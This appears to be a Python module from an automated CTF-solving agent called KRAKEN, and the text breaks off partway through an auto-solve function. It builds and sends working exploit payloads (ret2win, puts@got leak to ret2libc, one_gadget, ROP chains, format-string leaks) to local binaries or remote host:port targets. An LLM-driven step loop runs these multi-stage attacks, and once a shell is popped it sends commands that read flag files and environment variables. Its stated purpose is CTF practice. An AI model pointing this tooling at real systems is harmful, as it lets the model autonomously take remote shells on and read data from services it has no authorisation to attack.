#!/usr/bin/env python3
"""auto_pwn_interact -- Interactive remote-pwn loop driver for KRAKEN.

Fixes the Kalmar postmortem #1 finding: KRAKEN can solve *static* challenges
but could not drive *live / interactive* exploitation (multi-step send/recv,
leak -> libc -> ROP). This unlocks pwn.college and HTB pwn rooms.

It provides three layers:

1. ``PwnConnection`` -- a thin, consistent connection layer over pwntools that
   targets either a local ``process(binary)`` OR a ``remote(host, port)``,
   exposing uniform ``send / sendline / recv / recvuntil / recvline`` wrappers
   and logging the *full transcript* (every byte in/out) for the agent to read.

2. ``InteractiveSession`` -- the step() API. An agent / LLM drives a multi-step
   interaction as ``observe(output) -> decide -> act(send/leak/...)``. Helpers:
     - ``parse_leak`` / ``leak_address``  -- pull a 6/8-byte little-endian
       address out of a recv'd line (or a raw bytes blob).
     - ``resolve_libc``                   -- reuse ``auto_libc_lookup`` to turn a
       leaked symbol address into a libc base + system/binsh/one_gadget.
     - ``build_ret2win`` / ``build_ret2libc`` / ``build_rop`` /
       ``build_format_string`` -- build payload bytes for each stage, reusing
       ``auto_pwn_solve.PwnSolver`` (offset finding + gadget search) and
       ``auto_rop_extract`` where possible.
     - ``extract_flag``                   -- scan the running transcript.

3. A CLI (helper convention): on success prints ``EXTRACTED FLAG: <flag>`` to
   stdout and exits 0; otherwise exits non-zero, so ``tool_router`` can shell
   out and parse the marker.

Usage:
  python3 auto_pwn_interact.py ./vuln --win-addr 0x401196 --flag-format 'flag\\{.*\\}'
  python3 auto_pwn_interact.py 127.0.0.1:9001 --remote --win-addr 0x401196
  python3 auto_pwn_interact.py chal.ctf.io:1337 --remote --libc ./libc.so.6 --leak-func puts
  python3 auto_pwn_interact.py 127.0.0.1:9001 --remote --auto   # try all stages

Outputs EXTRACTED FLAG: <flag> on success.
"""

from __future__ import annotations

import argparse
import os
import re
import sys
from collections.abc import Callable
from typing import Any

# ---------------------------------------------------------------------------
# pwntools import with graceful degradation (mirrors auto_pwn_solve)
# ---------------------------------------------------------------------------
os.environ.setdefault("PWNLIB_NOTERM", "1")
os.environ.setdefault("PWNLIB_SILENT", "1")

PWNTOOLS_AVAILABLE = False
try:
    from pwn import (  # type: ignore[import-untyped]
        ELF,
        ROP,
        context,
        cyclic,
        cyclic_find,
        flat,
        p32,
        p64,
        process,
        remote,
        u32,
        u64,
    )

    PWNTOOLS_AVAILABLE = True
except ImportError:  # pragma: no cover - exercised only without pwntools
    ELF = ROP = context = None  # type: ignore[assignment]
    cyclic = cyclic_find = flat = None  # type: ignore[assignment]
    p32 = p64 = u32 = u64 = process = remote = None  # type: ignore[assignment]

# ---------------------------------------------------------------------------
# Local-helper imports (offset finding, libc resolution, gadget extraction).
# These live alongside this file; we import them by adding our own dir to the
# path so the helper works both as a module and as a standalone script.
# ---------------------------------------------------------------------------
_HELPERS_DIR = os.path.dirname(os.path.abspath(__file__))
if _HELPERS_DIR not in sys.path:
    sys.path.insert(0, _HELPERS_DIR)

try:
    import auto_libc_lookup  # type: ignore[import-not-found]
except Exception:  # pragma: no cover
    auto_libc_lookup = None  # type: ignore[assignment]

try:
    import auto_pwn_solve  # type: ignore[import-not-found]
except Exception:  # pragma: no cover
    auto_pwn_solve = None  # type: ignore[assignment]


# ---------------------------------------------------------------------------
# Flag scanning (shared shape with the other pwn helpers)
# ---------------------------------------------------------------------------
DEFAULT_FLAG_RE = re.compile(r"[a-zA-Z_][a-zA-Z0-9_]{1,}\{[^}]{1,}\}")

# Shell commands fired after we pop a shell, to surface a flag from the FS/env.
FLAG_CMDS = [
    b"cat flag.txt 2>/dev/null",
    b"cat flag 2>/dev/null",
    b"cat /flag.txt 2>/dev/null",
    b"cat /flag 2>/dev/null",
    b"cat ./flag* 2>/dev/null",
    b"cat /home/*/flag* 2>/dev/null",
    b"echo $FLAG 2>/dev/null",
    b"id 2>/dev/null",
]


def scan_flags(text: str, flag_format: str = "") -> list[str]:
    """Return all flag-like strings found in *text* (most specific first)."""
    flags: list[str] = []
    if flag_format:
        try:
            pat = re.compile(flag_format)
            flags.extend(m.group(0) for m in pat.finditer(text))
        except re.error:
            # Treat the format as a literal prefix (e.g. "flag{") instead.
            prefix_m = re.match(r"([A-Za-z_][A-Za-z0-9_]*)\\?\{?", flag_format)
            if prefix_m:
                prefix = re.escape(prefix_m.group(1))
                for m in re.finditer(prefix + r"\{[^}]{1,}\}", text):
                    flags.append(m.group(0))
    flags.extend(m.group(0) for m in DEFAULT_FLAG_RE.finditer(text))
    # Deduplicate, preserving order.
    seen: set[str] = set()
    unique: list[str] = []
    for f in flags:
        if f not in seen:
            seen.add(f)
            unique.append(f)
    return unique


def best_flag(flags: list[str]) -> str | None:
    """Pick the most plausible flag (longest brace-balanced candidate)."""
    if not flags:
        return None
    # Prefer well-formed flags ending in '}' and avoid obvious placeholders.
    bad = {"flag{example}", "flag{test}", "flag{redacted}", "flag{...}"}
    real = [f for f in flags if f.lower() not in bad]
    pool = real or flags
    return max(pool, key=len)


# ---------------------------------------------------------------------------
# Connection layer
# ---------------------------------------------------------------------------
class PwnConnection:
    """Uniform pwntools connection over a local process OR a remote socket.

    Wraps ``pwn.process`` / ``pwn.remote`` so the *same* send/recv API works in
    both modes, and records every exchanged byte into ``self.transcript`` (a
    list of ``(direction, bytes)`` tuples) so an agent can read the full
    conversation. ``direction`` is ``">>>"`` for sent and ``"<<<"`` for received.
    """

    def __init__(self, tube: Any, *, is_remote: bool, label: str):
        self.tube = tube
        self.is_remote = is_remote
        self.label = label
        self.transcript: list[tuple[str, bytes]] = []

    # -- constructors -------------------------------------------------------
    @classmethod
    def open_local(
        cls, binary: str, argv: list[str] | None = None, *, env: dict | None = None, cwd: str | None = None
    ) -> PwnConnection:
        """Start a local process tube.

        Runs in the binary's own directory by default so a win()/shell that
        does ``cat flag.txt`` finds the flag that conventionally sits beside
        the challenge binary (CTF / pwn.college layout).
        """
        if not PWNTOOLS_AVAILABLE:
            raise RuntimeError("pwntools is required for PwnConnection")
        path = os.path.abspath(binary)
        if not os.access(path, os.X_OK):
            try:
                os.chmod(path, 0o755)
            except OSError:
                pass
        cmd = [path] + list(argv or [])
        run_cwd = cwd or os.path.dirname(path) or None
        # Use pipes (not a PTY) so EOF semantics are clean: a PTY-backed
        # process blocked on read never delivers EOF on close, which hangs
        # recv. Pipes give deterministic recv/EOF behaviour for both local
        # processes and our TCP-wrapped socket services.
        from subprocess import PIPE, STDOUT

        tube = process(cmd, env=env, cwd=run_cwd, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
        return cls(tube, is_remote=False, label=path)

    @classmethod
    def open_remote(cls, host: str, port: int) -> PwnConnection:
        """Connect to a remote TCP service."""
        if not PWNTOOLS_AVAILABLE:
            raise RuntimeError("pwntools is required for PwnConnection")
        tube = remote(host, int(port))
        return cls(tube, is_remote=True, label=f"{host}:{port}")

    @classmethod
    def open(cls, target: str, *, is_remote: bool = False, argv: list[str] | None = None) -> PwnConnection:
        """Open a connection from a CLI-style target string.

        ``target`` is either a path to a local binary, or ``host:port`` when
        ``is_remote`` is set (or when it already looks like ``host:port``).
        """
        if is_remote or (":" in target and not os.path.exists(target)):
            host, _, port = target.rpartition(":")
            return cls.open_remote(host, int(port))
        return cls.open_local(target, argv)

    # -- normalisation ------------------------------------------------------
    @staticmethod
    def _b(data: str | bytes) -> bytes:
        return data.encode() if isinstance(data, str) else data

    def _log(self, direction: str, data: bytes) -> None:
        if data:
            self.transcript.append((direction, data))

    # -- send wrappers ------------------------------------------------------
    def send(self, data: str | bytes) -> None:
        raw = self._b(data)
        self.tube.send(raw)
        self._log(">>>", raw)

    def sendline(self, data: str | bytes = b"") -> None:
        raw = self._b(data)
        self.tube.sendline(raw)
        self._log(">>>", raw + b"\n")

    def sendafter(self, delim: str | bytes, data: str | bytes, timeout: float = 5.0) -> bytes:
        """Recv until *delim*, then send *data* (returns the recv'd bytes)."""
        got = self.recvuntil(delim, timeout=timeout)
        self.send(data)
        return got

    def sendlineafter(self, delim: str | bytes, data: str | bytes = b"", timeout: float = 5.0) -> bytes:
        got = self.recvuntil(delim, timeout=timeout)
        self.sendline(data)
        return got

    # -- recv wrappers ------------------------------------------------------
    def recv(self, numb: int = 4096, timeout: float = 5.0) -> bytes:
        try:
            data = self.tube.recv(numb, timeout=timeout)
        except EOFError:
            data = b""
        self._log("<<<", data)
        return data

    def recvuntil(self, delim: str | bytes, timeout: float = 5.0, drop: bool = False) -> bytes:
        try:
            data = self.tube.recvuntil(self._b(delim), drop=drop, timeout=timeout)
        except EOFError:
            data = b""
        self._log("<<<", data)
        return data

    def recvline(self, timeout: float = 5.0, keepends: bool = True) -> bytes:
        try:
            data = self.tube.recvline(keepends=keepends, timeout=timeout)
        except EOFError:
            data = b""
        self._log("<<<", data)
        return data

    def recvall(self, timeout: float = 3.0) -> bytes:
        try:
            data = self.tube.recvall(timeout=timeout)
        except EOFError:
            data = b""
        self._log("<<<", data)
        return data

    def clean(self, timeout: float = 0.5) -> bytes:
        """Drain any buffered output (non-blocking-ish)."""
        try:
            data = self.tube.clean(timeout=timeout)
        except EOFError:
            data = b""
        self._log("<<<", data)
        return data

    def interactive(self) -> None:  # pragma: no cover - manual use only
        self.tube.interactive()

    # -- lifecycle ----------------------------------------------------------
    def is_alive(self) -> bool:
        try:
            return self.tube.connected()
        except Exception:
            return False

    def close(self) -> None:
        try:
            self.tube.close()
        except Exception:
            pass

    # -- introspection ------------------------------------------------------
    def transcript_text(self) -> str:
        """Render the full transcript as decoded text for the agent / logs."""
        lines = []
        for direction, data in self.transcript:
            decoded = data.decode("utf-8", errors="replace").rstrip("\n")
            lines.append(f"{direction} {decoded}")
        return "\n".join(lines)

    def transcript_bytes(self) -> bytes:
        """Concatenate all *received* bytes (for flag scanning of raw output)."""
        return b"".join(d for direction, d in self.transcript if direction == "<<<")


# ---------------------------------------------------------------------------
# Leak / address parsing helpers
# ---------------------------------------------------------------------------
def parse_leak(blob: str | bytes, *, bits: int = 64) -> int | None:
    """Extract a leaked address from a recv'd line or raw bytes.

    Strategy (in order):
      1. A ``0x...`` hex literal in the text.
      2. The first non-trivial little-endian word of the right width when the
         blob is raw bytes (e.g. a ``puts()`` leak that printed raw address
         bytes). Leading newlines / NULs are stripped first.
    """
    width = 8 if bits == 64 else 4
    # Text-form hex first.
    text = blob.decode("latin-1") if isinstance(blob, bytes) else blob
    m = re.search(r"0x[0-9a-fA-F]{4,16}", text)
    if m:
        try:
            return int(m.group(0), 16)
        except ValueError:
            pass
    # Raw little-endian bytes.
    raw = blob if isinstance(blob, bytes) else blob.encode("latin-1")
    raw = raw.lstrip(b"\n")
    if len(raw) >= width:
        chunk = raw[:width].ljust(width, b"\x00")
        val = int.from_bytes(chunk, "little")
        # A sane userspace pointer on amd64 lives below the canonical ceiling
        # and above the first page; reject obvious garbage.
        if val > 0x1000:
            return val
    return None


def leak_address(line: str | bytes, *, bits: int = 64) -> int | None:
    """Alias kept for readability in agent-authored step callbacks."""
    return parse_leak(line, bits=bits)


# ---------------------------------------------------------------------------
# libc resolution (reuse auto_libc_lookup)
# ---------------------------------------------------------------------------
class LibcResolution:
    """Result of resolving a libc base from a single leaked symbol."""

    def __init__(self, base: int, version: str, libc_id: str, symbols: dict[str, int], one_gadgets: list[int]):
        self.base = base
        self.version = version
        self.libc_id = libc_id
        self.symbols = symbols  # offsets within libc
        self.one_gadgets = one_gadgets  # offsets within libc

    def addr(self, name: str) -> int | None:
        """Absolute runtime address of a libc symbol, or None if unknown."""
        off = self.symbols.get(name)
        return None if off is None else self.base + off

    @property
    def system(self) -> int | None:
        return self.addr("system")

    @property
    def binsh(self) -> int | None:
        return self.addr("str_bin_sh")

    def one_gadget_addrs(self) -> list[int]:
        return [self.base + g for g in self.one_gadgets]

    def __repr__(self) -> str:  # pragma: no cover - debug aid
        return (
            f"<LibcResolution {self.libc_id} base={hex(self.base)} system={hex(self.system) if self.system else None}>"
        )


def resolve_libc(
    leak_func: str, leaked_addr: int, *, arch: str = "amd64", libc_path: str | None = None
) -> LibcResolution | None:
    """Resolve a libc base + primitives from a single leaked symbol address.

    Reuses ``auto_libc_lookup``. If ``libc_path`` is supplied we read the exact
    offsets from that binary (authoritative); otherwise we fingerprint against
    the built-in glibc offset database.
    """
    if auto_libc_lookup is None:
        return None

    # Authoritative path: a supplied libc binary.
    if libc_path and os.path.isfile(libc_path):
        info = auto_libc_lookup.analyze_libc_binary(libc_path)
        leak_off = info.get(leak_func)
        if leak_off:
            base = leaked_addr - leak_off
            if base > 0 and base & 0xFFF == 0:
                symbols = {k: v for k, v in info.items()}
                return LibcResolution(
                    base=base,
                    version="(from binary)",
                    libc_id=os.path.basename(libc_path),
                    symbols=symbols,
                    one_gadgets=[],
                )

    # Fingerprint path: match the leak against the built-in DB.
    matches = auto_libc_lookup.identify_libc({leak_func: leaked_addr}, arch)
    if not matches:
        return None
    best = matches[0]
    entry = best["entry"]
    return LibcResolution(
        base=best["base"],
        version=entry["version"],
        libc_id=entry["id"],
        symbols=dict(entry["symbols"]),
        one_gadgets=list(entry.get("one_gadgets", [])),
    )


# ---------------------------------------------------------------------------
# Payload / stage builders (reuse auto_pwn_solve.PwnSolver + auto_rop_extract)
# ---------------------------------------------------------------------------
class StageBuilder:
    """Builds raw payload bytes for the common pwn stages.

    Wraps an ``auto_pwn_solve.PwnSolver`` (already analysed) to reuse its offset
    finding (cyclic / source / gdb) and gadget search (pwntools ROP + ropper
    fallback). All ``build_*`` methods return ``bytes`` ready to ``sendline``.
    """

    def __init__(
        self,
        binary: str,
        *,
        source: str | None = None,
        libc_path: str | None = None,
        offset: int | None = None,
        bits: int = 64,
    ):
        self.binary = os.path.abspath(binary)
        self.bits = bits
        self.arch = "amd64" if bits == 64 else "i386"
        self.offset = offset
        self.solver = None
        self.elf = None
        if auto_pwn_solve is not None and PWNTOOLS_AVAILABLE:
            try:
                self.solver = auto_pwn_solve.PwnSolver(
                    binary_path=self.binary,
                    source_path=source,
                    libc_path=libc_path,
                )
                self.solver.analyze()
                self.elf = self.solver.elf
                self.bits = self.solver.bits
                self.arch = self.solver.arch
                if self.offset is None and self.solver.offset is not None:
                    self.offset = self.solver.offset
            except Exception:
                self.solver = None
        # Fall back to a bare ELF for symbol lookup if the solver failed.
        if self.elf is None and PWNTOOLS_AVAILABLE:
            try:
                self.elf = ELF(self.binary, checksec=False)
                self.bits = self.elf.bits
                self.arch = self.elf.arch
            except Exception:
                self.elf = None

    # -- helpers ------------------------------------------------------------
    @property
    def word(self) -> int:
        return 8 if self.bits == 64 else 4

    @property
    def is_x86(self) -> bool:
        """True for i386/amd64. Ret-alignment + pop-rdi ROP are x86-only."""
        return self.arch in ("i386", "amd64")

    def _pack(self, value: int) -> bytes:
        return p64(value) if self.bits == 64 else p32(value)

    def find_offset(self, fallback: int | None = None) -> int | None:
        """Return the overflow offset (analysed, supplied, or fallback)."""
        if self.offset is not None:
            return self.offset
        if self.solver is not None and self.solver.offset is not None:
            return self.solver.offset
        return fallback

    def resolve_win(self, win: str | int | None) -> int | None:
        """Resolve a win() target: an int address, a symbol name, or autodetect."""
        if isinstance(win, int):
            return win
        if isinstance(win, str):
            if win.lower().startswith("0x"):
                try:
                    return int(win, 16)
                except ValueError:
                    return None
            if self.elf is not None and win in self.elf.symbols:
                return self.elf.symbols[win]
            return None
        # Autodetect from solver's discovered win functions.
        if self.solver is not None and self.solver.win_functions:
            # Prefer the most "flag/win"-ish name.
            for pref in ("win", "get_flag", "print_flag", "flag", "shell"):
                for name, addr in self.solver.win_functions.items():
                    if pref in name.lower():
                        return addr
            return next(iter(self.solver.win_functions.values()))
        return None

    # -- stages -------------------------------------------------------------
    def build_ret2win(
        self, win: str | int | None = None, offset: int | None = None, ret_align: bool = True
    ) -> bytes | None:
        """Padding -> [ret align] -> win()."""
        off = offset if offset is not None else self.find_offset()
        target = self.resolve_win(win)
        if off is None or target is None:
            return None
        payload = b"A" * off
        # Stack-alignment ret is an x86-64 SysV-ABI quirk (movaps before a
        # call needs 16-byte alignment). On aarch64 / other arches an extra
        # gadget here just overshoots the saved return slot, so skip it.
        if self.bits == 64 and self.is_x86 and ret_align:
            ret = self.solver._find_ret_gadget() if self.solver else None
            if ret:
                payload += self._pack(ret)
        payload += self._pack(target)
        return payload

    def build_format_string(self, offset: int | None = None, count: int = 40) -> bytes:
        """A scanning format-string payload that dumps ``count`` stack words.

        Useful as a *leak* primitive in the observe step: send it, then read
        the ``0xdeadbeef`` style words back to locate a libc / PIE pointer.
        """
        if offset is not None:
            return f"%{offset}$p".encode()
        return b".".join(f"%{i}$p".encode() for i in range(1, count + 1))

    def build_ret2libc(self, libc: LibcResolution, offset: int | None = None, ret_align: bool = True) -> bytes | None:
        """Padding -> system("/bin/sh") chain.

        amd64: pop rdi; ret -> &/bin/sh -> [ret align] -> system.
        i386:  system -> fake ret -> &/bin/sh (cdecl).
        aarch64: needs a 'pop x0' gadget (rare); returns None when absent so
        the caller falls back to one_gadget.
        """
        off = offset if offset is not None else self.find_offset()
        if off is None or self.solver is None:
            return None
        system = libc.system
        binsh = libc.binsh
        if system is None or binsh is None:
            return None
        payload = b"A" * off
        if self.arch == "amd64":
            pop_rdi = self.solver._find_pop_rdi_ret()
            ret = self.solver._find_ret_gadget()
            if pop_rdi is None:
                return None
            payload += self._pack(pop_rdi)
            payload += self._pack(binsh)
            if ret_align and ret:
                payload += self._pack(ret)
            payload += self._pack(system)
        elif self.arch == "i386":  # system(arg) via cdecl stack
            payload += self._pack(system)
            payload += self._pack(0xDEADBEEF)  # fake return addr
            payload += self._pack(binsh)
        else:
            # No portable single-gadget ret2libc for this arch; let the caller
            # try one_gadget (which sets registers + jumps in one go).
            return None
        return payload

    def build_one_gadget(self, libc: LibcResolution, offset: int | None = None) -> list[bytes]:
        """Return candidate payloads, one per one_gadget (caller tries each)."""
        off = offset if offset is not None else self.find_offset()
        out: list[bytes] = []
        if off is None:
            return out
        for gadget_addr in libc.one_gadget_addrs():
            out.append(b"A" * off + self._pack(gadget_addr))
        return out

    def build_rop(self, chain_addrs: list[int], offset: int | None = None) -> bytes | None:
        """Padding -> raw ROP chain (list of absolute addresses)."""
        off = offset if offset is not None else self.find_offset()
        if off is None:
            return None
        payload = b"A" * off
        for addr in chain_addrs:
            payload += self._pack(addr)
        return payload

    def build_leak_ret2libc_stage1(
        self, leak_func: str = "puts", ret_after: str | None = "main", offset: int | None = None
    ) -> tuple[bytes, str] | None:
        """Stage-1 of a classic leak: call puts(puts@got), then return to main.

        Returns ``(payload, leak_func)`` so the caller can resolve the libc from
        the leaked GOT entry, or None when the gadgets/symbols are missing.
        Only meaningful on amd64 non-PIE (the common pwn.college / HTB shape):
        it relies on a ``pop rdi; ret`` gadget to set the puts() argument.
        """
        if self.solver is None or self.arch != "amd64":
            return None
        off = offset if offset is not None else self.find_offset()
        if off is None:
            return None
        pop_rdi = self.solver._find_pop_rdi_ret()
        if pop_rdi is None or self.elf is None:
            return None
        # Need an in-binary PLT for the leaking function and a GOT entry to leak.
        if leak_func not in self.elf.plt or leak_func not in self.elf.got:
            # Fall back to puts if available.
            if "puts" in self.elf.plt and "puts" in self.elf.got:
                leak_func = "puts"
            else:
                return None
        plt = self.elf.plt[leak_func]
        got = self.elf.got[leak_func]
        ret_addr = None
        if ret_after and ret_after in self.elf.symbols:
            ret_addr = self.elf.symbols[ret_after]
        payload = b"A" * off
        payload += self._pack(pop_rdi)
        payload += self._pack(got)
        payload += self._pack(plt)
        if ret_addr is not None:
            payload += self._pack(ret_addr)
        return payload, leak_func


# ---------------------------------------------------------------------------
# Interactive session -- the step() API
# ---------------------------------------------------------------------------
class InteractiveSession:
    """Stateful driver for multi-step interactive exploitation.

    The core contract is ``step(callback)``: the callback is handed an
    ``Observation`` (the most recent output + the running transcript + a handle
    to this session) and decides what to do -- typically returning an ``Action``
    (send bytes, expect a delimiter, mark done, etc.). This lets an agent / LLM
    drive ``observe -> decide -> act`` cycles without re-implementing the I/O.

    Convenience methods (``leak``, ``resolve_libc``, ``builder``, ``send_*``,
    ``check_flag``) cover the leak -> libc -> ROP path directly so simple
    programmatic solves don't even need callbacks.
    """

    def __init__(
        self,
        conn: PwnConnection,
        *,
        binary: str | None = None,
        source: str | None = None,
        libc_path: str | None = None,
        flag_format: str = "",
        bits: int = 64,
        offset: int | None = None,
    ):
        self.conn = conn
        self.binary = os.path.abspath(binary) if binary else None
        self.source = source
        self.libc_path = libc_path
        self.flag_format = flag_format
        self.bits = bits
        self._builder: StageBuilder | None = None
        self._offset = offset
        self.libc: LibcResolution | None = None
        self.last_output: bytes = b""
        self.flag: str | None = None

    # -- builder (lazy) -----------------------------------------------------
    def builder(self) -> StageBuilder | None:
        """Return a (cached) StageBuilder bound to the local binary."""
        if self._builder is None and self.binary:
            self._builder = StageBuilder(
                self.binary,
                source=self.source,
                libc_path=self.libc_path,
                offset=self._offset,
                bits=self.bits,
            )
            if self._builder.offset is not None:
                self._offset = self._builder.offset
            self.bits = self._builder.bits
        return self._builder

    @property
    def offset(self) -> int | None:
        b = self.builder()
        if b is not None and b.offset is not None:
            return b.offset
        return self._offset

    # -- raw I/O passthroughs (also record last_output) ---------------------
    def send(self, data: str | bytes) -> None:
        self.conn.send(data)

    def sendline(self, data: str | bytes = b"") -> None:
        self.conn.sendline(data)

    def recv(self, numb: int = 4096, timeout: float = 5.0) -> bytes:
        self.last_output = self.conn.recv(numb, timeout=timeout)
        return self.last_output

    def recvuntil(self, delim: str | bytes, timeout: float = 5.0, drop: bool = False) -> bytes:
        self.last_output = self.conn.recvuntil(delim, timeout=timeout, drop=drop)
        return self.last_output

    def recvline(self, timeout: float = 5.0, keepends: bool = True) -> bytes:
        self.last_output = self.conn.recvline(timeout=timeout, keepends=keepends)
        return self.last_output

    def sendline_after(self, delim: str | bytes, data: str | bytes = b"", timeout: float = 5.0) -> bytes:
        got = self.conn.sendlineafter(delim, data, timeout=timeout)
        self.last_output = got
        return got

    # -- leak / libc --------------------------------------------------------
    def leak(self, source: str | bytes | None = None) -> int | None:
        """Parse a leaked address from *source* (defaults to last output)."""
        blob = source if source is not None else self.last_output
        return parse_leak(blob, bits=self.bits)

    def resolve_libc(self, leak_func: str, leaked_addr: int, arch: str | None = None) -> LibcResolution | None:
        """Resolve + cache a libc base from a leaked symbol address."""
        a = arch or ("amd64" if self.bits == 64 else "i386")
        self.libc = resolve_libc(
            leak_func,
            leaked_addr,
            arch=a,
            libc_path=self.libc_path,
        )
        return self.libc

    # -- stage send helpers -------------------------------------------------
    def send_ret2win(self, win: str | int | None = None) -> bool:
        b = self.builder()
        if b is None:
            return False
        payload = b.build_ret2win(win, offset=self.offset)
        if payload is None:
            return False
        self.conn.sendline(payload)
        return True

    def send_ret2libc(self) -> bool:
        b = self.builder()
        if b is None or self.libc is None:
            return False
        payload = b.build_ret2libc(self.libc, offset=self.offset)
        if payload is None:
            return False
        self.conn.sendline(payload)
        return True

    def send_rop(self, chain_addrs: list[int]) -> bool:
        b = self.builder()
        if b is None:
            return False
        payload = b.build_rop(chain_addrs, offset=self.offset)
        if payload is None:
            return False
        self.conn.sendline(payload)
        return True

    # -- shell + flag -------------------------------------------------------
    def recv_and_scan(
        self, flag_format: str | None = None, duration: float = 2.0, chunk_timeout: float = 0.5
    ) -> str | None:
        """Drain output for up to *duration* seconds, scanning for a flag.

        This is the right primitive immediately after a ret2win / ret2libc
        payload that *prints* the flag directly (no shell): some targets flood
        output (e.g. an aarch64 win() that returns into a loop) and never EOF,
        so a single recv races the flag. We loop until we see it or time out.
        """
        fmt = flag_format if flag_format is not None else self.flag_format
        import time as _t

        deadline = _t.time() + duration
        while _t.time() < deadline:
            out = self.conn.recv(timeout=chunk_timeout)
            flag = self.check_flag(flag_format=fmt)
            if flag:
                return flag
            if not out and not self.conn.is_alive():
                break
        return self.check_flag(flag_format=fmt)

    def try_shell_for_flag(self, flag_format: str | None = None, timeout: float = 3.0) -> str | None:
        """Read flag-printing output, then (if needed) drive a popped shell.

        First drains any directly-printed flag (ret2win/ret2libc that cats the
        flag), and only then falls back to firing shell commands for the
        ret2shell / system("/bin/sh") case.
        """
        fmt = flag_format or self.flag_format
        # Phase 1: the payload may have printed the flag directly.
        flag = self.recv_and_scan(flag_format=fmt, duration=1.5)
        if flag:
            return flag
        # Phase 2: assume a shell -- fire flag-reading commands.
        for cmd in FLAG_CMDS:
            try:
                self.conn.sendline(cmd)
            except Exception:
                break
            self.conn.recv(timeout=1.0)
            # Scan the whole transcript so a flag split across recv
            # boundaries (or printed before our command echoed) is caught.
            flag = self.check_flag(flag_format=fmt)
            if flag:
                return flag
        # Final bounded drain (never recvall: a looping win() never EOFs).
        return self.recv_and_scan(flag_format=fmt, duration=timeout)

    def check_flag(self, text: str | None = None, flag_format: str | None = None) -> str | None:
        """Scan *text* (or the whole transcript) for a flag; cache + return it."""
        fmt = flag_format if flag_format is not None else self.flag_format
        haystack = text if text is not None else self.conn.transcript_text()
        flags = scan_flags(haystack, fmt)
        # Also scan raw received bytes (handles non-UTF8 framing).
        flags += scan_flags(self.conn.transcript_bytes().decode("latin-1"), fmt)
        flag = best_flag(flags)
        if flag:
            self.flag = flag
        return flag

    # -- the step() API -----------------------------------------------------
    def step(self, decide: Callable[[Observation], Action | None]) -> Action | None:
        """Run one observe -> decide -> act cycle.

        ``decide`` receives an :class:`Observation` and returns an
        :class:`Action` (or None to no-op). The action is applied here, so the
        agent's callback stays pure: read state, choose move.
        """
        obs = Observation(
            output=self.last_output,
            transcript=self.conn.transcript_text(),
            session=self,
        )
        action = decide(obs)
        if action is not None:
            action.apply(self)
            # After a payload that sends data, drain the response so the *next*
            # observation (and run_loop's flag check) reflects it. A ret2win /
            # ret2libc that prints the flag directly is captured here.
            if action.kind in ("send", "sendline", "ret2win", "ret2libc", "rop"):
                self.recv_and_scan(duration=1.5)
        return action

    def run_loop(self, decide: Callable[[Observation], Action | None], max_steps: int = 32) -> str | None:
        """Drive ``step`` repeatedly until an action signals done or flag found."""
        for _ in range(max_steps):
            action = self.step(decide)
            if self.check_flag():
                return self.flag
            if action is not None and action.done:
                break
            if not self.conn.is_alive() and action is None:
                break
        return self.check_flag()

    def close(self) -> None:
        self.conn.close()


class Observation:
    """Immutable-ish snapshot handed to a decide() callback."""

    def __init__(self, output: bytes, transcript: str, session: InteractiveSession):
        self.output = output
        self.text = output.decode("utf-8", errors="replace")
        self.transcript = transcript
        self.session = session

    def leak(self) -> int | None:
        return self.session.leak(self.output)

    def contains(self, needle: str) -> bool:
        return needle in self.text or needle in self.transcript


class Action:
    """A move an agent decides on, applied by :meth:`InteractiveSession.step`.

    Construct via the classmethods (``send``, ``sendline``, ``recv_until``,
    ``ret2win``, ``ret2libc``, ``rop``, ``shell``, ``finish``).
    """

    def __init__(
        self,
        kind: str,
        *,
        payload: Any = None,
        done: bool = False,
        fn: Callable[[InteractiveSession], None] | None = None,
    ):
        self.kind = kind
        self.payload = payload
        self.done = done
        self._fn = fn

    # -- constructors -------------------------------------------------------
    @classmethod
    def send(cls, data: str | bytes) -> Action:
        return cls("send", payload=data)

    @classmethod
    def sendline(cls, data: str | bytes = b"") -> Action:
        return cls("sendline", payload=data)

    @classmethod
    def recv_until(cls, delim: str | bytes) -> Action:
        return cls("recv_until", payload=delim)

    @classmethod
    def ret2win(cls, win: str | int | None = None) -> Action:
        return cls("ret2win", payload=win)

    @classmethod
    def ret2libc(cls) -> Action:
        return cls("ret2libc")

    @classmethod
    def rop(cls, chain_addrs: list[int]) -> Action:
        return cls("rop", payload=chain_addrs)

    @classmethod
    def shell(cls) -> Action:
        return cls("shell")

    @classmethod
    def custom(cls, fn: Callable[[InteractiveSession], None], done: bool = False) -> Action:
        return cls("custom", fn=fn, done=done)

    @classmethod
    def finish(cls) -> Action:
        return cls("finish", done=True)

    # -- apply --------------------------------------------------------------
    def apply(self, session: InteractiveSession) -> None:
        if self.kind == "send":
            session.send(self.payload)
        elif self.kind == "sendline":
            session.sendline(self.payload)
        elif self.kind == "recv_until":
            session.recvuntil(self.payload)
        elif self.kind == "ret2win":
            session.send_ret2win(self.payload)
        elif self.kind == "ret2libc":
            session.send_ret2libc()
        elif self.kind == "rop":
            session.send_rop(self.payload or [])
        elif self.kind == "shell":
            session.try_shell_for_flag()
        elif self.kind == "custom" and self._fn is not None:
            self._fn(session)
        # "finish" is a pure signal handled by run_loop.


# ---------------------------------------------------------------------------
# Auto solver -- programmatic leak -> libc -> ROP without callbacks
# ---------------------------------------------------------------------------
def auto_solve(
    conn: PwnConnection,
    *,
    binary: str | None,
    source: str | None = None,
    libc_path: str | None = None,
    win_addr: str | int | None = None,
    leak_func: str = "puts",
    flag_format: str = "",
    bits: int = 64,
    offset: int | None = None,
) -> tuple[str | None, InteractiveSession]:
    """Try the standard interactive stages in order; return (flag, session).

    Order:
      1. Drain banner + scan (some challenges just print the flag).
      2. ret2win (explicit ``win_addr`` or autodetected win()).
      3. leak -> libc -> ret2libc (puts@got leak, return to main, system/binsh).
      4. one_gadget candidates against the resolved libc.
    Each stage opens a fresh connection when the previous one consumed the
    process, so a crash on stage N doesn't poison stage N+1.
    """
    session = InteractiveSession(
        conn,
        binary=binary,
        source=source,
        libc_path=libc_path,
        flag_format=flag_format,
        bits=bits,
        offset=offset,
    )

    # Stage 0: read banner / any immediately-printed flag.
    session.recv(timeout=1.0)
    flag = session.check_flag()
    if flag:
        return flag, session

    builder = session.builder()

    def _fresh() -> PwnConnection:
        """Reconnect using the same target as the original connection."""
        if conn.is_remote:
            host, _, port = conn.label.rpartition(":")
            return PwnConnection.open_remote(host, int(port))
        return PwnConnection.open_local(conn.label)

    # Stage 1: ret2win.
    if builder is not None and (win_addr is not None or (builder.solver and builder.solver.win_functions)):
